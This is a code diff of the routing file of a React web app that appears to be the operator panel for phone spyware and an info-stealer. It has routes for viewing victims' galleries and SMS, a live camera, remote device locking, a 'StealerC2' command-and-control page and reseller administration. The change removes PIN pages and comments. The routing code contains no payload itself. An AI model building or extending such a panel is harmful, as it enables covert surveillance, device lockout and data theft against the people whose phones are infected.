@@ -13,25 +13,15 @@ import LoadingSpinner from './components/common/LoadingSpinner';
 import Login from './components/auth/Login';
 import Dashboard from './components/dashboard/Dashboard';
 import Admin from './components/admin/Admin';
-
-// Monitoring Pages
+import AdminUsers from './components/admin/AdminUsers';
+import AdminDevices from './components/admin/AdminDevices';
+import AdminResellers from './components/admin/AdminResellers';
 import DeviceGallery from './components/monitoring/DeviceGallery';
 import SMSViewer from './components/monitoring/SMSViewer';
 import LiveCamera from './components/monitoring/LiveCamera';
 import LiveMonitoring from './components/monitoring/LiveMonitoring';
 import DeviceLock from './components/monitoring/DeviceLock';
-
-// Stealer Pages
 import StealerC2 from './components/stealer/StealerC2';
-
-// Admin Pages
-import AdminUsers from './components/admin/AdminUsers';
-import AdminDevices from './components/admin/AdminDevices';
-import AdminResellers from './components/admin/AdminResellers';
-
-// PIN Pages
-import PinPage from './components/pin/PinPage';
-import PinManager from './components/pin/PinManager';
 
 const AppContent = () => {
   const { user, loading } = useAuth();
@@ -52,54 +42,28 @@ const AppContent = () => {
             border: '1px solid #374151',
             borderRadius: '12px'
           },
-          success: {
-            icon: '✅',
-            duration: 3000,
-          },
-          error: {
-            icon: '❌',
-            duration: 4000,
-          },
-          loading: {
-            icon: '⏳',
-            duration: 2000,
-          }
         }}
       />
       
       <Routes>
-        {/* Auth Routes */}
         <Route path="/login" element={
-          user ? <Navigate to="/dashboard" replace /> : <Login />
+          user ? <Navigate to="/dashboard" /> : <Login />
         } />
         
-        {/* Protected Routes */}
         <Route path="/" element={
           <ProtectedRoute user={user}>
             <Layout />
           </ProtectedRoute>
         }>
-          {/* Default Redirect */}
-          <Route index element={<Navigate to="/dashboard" replace />} />
-          
-          {/* Dashboard */}
+          <Route index element={<Navigate to="/dashboard" />} />
           <Route path="dashboard" element={<Dashboard />} />
-          
-          {/* Monitoring Routes */}
           <Route path="gallery" element={<DeviceGallery />} />
           <Route path="sms" element={<SMSViewer />} />
           <Route path="camera" element={<LiveCamera />} />
           <Route path="monitoring" element={<LiveMonitoring />} />
           <Route path="device-lock" element={<DeviceLock />} />
-          
-          {/* Stealer Routes */}
           <Route path="stealer" element={<StealerC2 />} />
           
-          {/* PIN Routes */}
-          <Route path="pin" element={<PinPage />} />
-          <Route path="pin/manage" element={<PinManager />} />
-          
-          {/* Admin Routes */}
           <Route path="admin" element={
             <AdminRoute user={user}>
               <Admin />
@@ -120,15 +84,9 @@ const AppContent = () => {
               <AdminResellers />
             </AdminRoute>
           } />
-          <Route path="admin/pin" element={
-            <AdminRoute user={user}>
-              <PinManager />
-            </AdminRoute>
-          } />
         </Route>
         
-        {/* 404 - Not Found */}
-        <Route path="*" element={<Navigate to="/dashboard" replace />} />
+        <Route path="*" element={<Navigate to="/dashboard" />} />
       </Routes>
     </Router>
   );
